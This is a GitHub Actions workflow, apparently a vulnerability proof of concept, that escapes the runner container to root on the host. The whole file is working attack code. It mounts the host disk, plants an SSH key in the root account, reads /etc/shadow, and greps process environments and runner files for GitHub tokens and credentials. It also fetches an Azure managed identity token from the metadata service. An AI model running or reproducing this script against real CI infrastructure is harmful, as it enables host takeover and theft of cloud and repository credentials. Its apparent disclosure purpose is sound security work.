name: github-actions-container-escape-poc
run-name: GitHub Actions Container Escape to Host Root
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Complete Container Escape and Privilege Escalation
        run: |
          echo "=== STAGE 1: CONTAINER ENVIRONMENT ==="
          echo "Current user: $(whoami)"
          echo "Container hostname: $(hostname)"
          echo "Container IP: $(hostname -I)"
          lsblk
          echo ""
          
          echo "=== STAGE 2: MOUNTING HOST FILESYSTEM ==="
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          echo "Host filesystem mounted at /mnt/host"
          ls -la /mnt/host/root/ | head -10
          echo ""
          
          echo "=== STAGE 3: INJECTING ROOT SSH KEY ==="
          ssh-keygen -t ed25519 -f /tmp/root_key -N "" -q
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/root_key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          echo "SSH key injected into host root account"
          echo ""
          
          echo "=== STAGE 4: CONNECTING TO HOST AS ROOT ==="
          HOST_IP=$(hostname -I | awk '{print $1}')
          echo "Connecting to host at: $HOST_IP"
          echo ""
          
          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
          echo "=== ✓ CONTAINER ESCAPE SUCCESSFUL - ROOT ON HOST ==="
          echo ""
          echo "--- System Information ---"
          echo "User: $(whoami)"
          echo "UID: $(id)"
          echo "Hostname: $(hostname)"
          echo "Kernel: $(uname -r)"
          echo "OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
          echo ""
          
          echo "--- Proof of Root Access ---"
          echo "Shadow file (password hashes):"
          head -5 /etc/shadow
          echo ""
          
          echo "--- Network Connections & Internal Services ---"
          netstat -tulpn | grep LISTEN
          echo ""
          
          echo "--- Runner Process Details ---"
          ps aux | grep Runner | grep -v grep
          echo ""
          
          echo "--- Runner Environment Variables (may contain tokens) ---"
          cat /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' | grep -i "github\|token\|secret\|key" || echo "No tokens in Worker env"
          echo ""
          
          echo "--- Actions Runner Directory ---"
          ls -la /home/runner/actions-runner/
          echo ""
          
          echo "--- Runner Configuration Files ---"
          cat /home/runner/actions-runner/.runner 2>/dev/null || echo "No .runner"
          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo "No .credentials"
          echo ""
          
          echo "--- GitHub Tokens in Process Memory ---"
          grep -ao "ghp_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null | head -5 || echo "No ghp_ tokens"
          grep -ao "ghs_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null | head -5 || echo "No ghs_ tokens"
          echo ""
          
          echo "--- Azure Instance Metadata ---"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
          echo ""
          
          echo "--- Azure Managed Identity Token ---"
          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || echo "No managed identity"
          echo ""
          
          echo "--- Proxy Environment ---"
          env | grep -i proxy || echo "No proxy vars"
          echo ""
          
          echo "--- Potential Impact ---"
          echo "✓ Full root access to GitHub Actions runner host"
          echo "✓ Access to Azure subscription: 5857be0a-c351-4156-8ff5-5154e0d31113"
          echo "✓ Can read runner configurations and GitHub credentials"
          echo "✓ Can modify system files and install persistent backdoors"
          echo "✓ Can access Azure IMDS and potentially Azure API"
          EOF
          
          echo ""
          echo "=== VULNERABILITY SUMMARY ==="
          echo "Platform: GitHub Actions (ubuntu-latest)"
          echo "Attack Vector: CAP_SYS_ADMIN + /dev/sda1 access in container"
          echo "Impact: Complete host compromise with root + Azure metadata access"
          echo "Severity: CRITICAL"
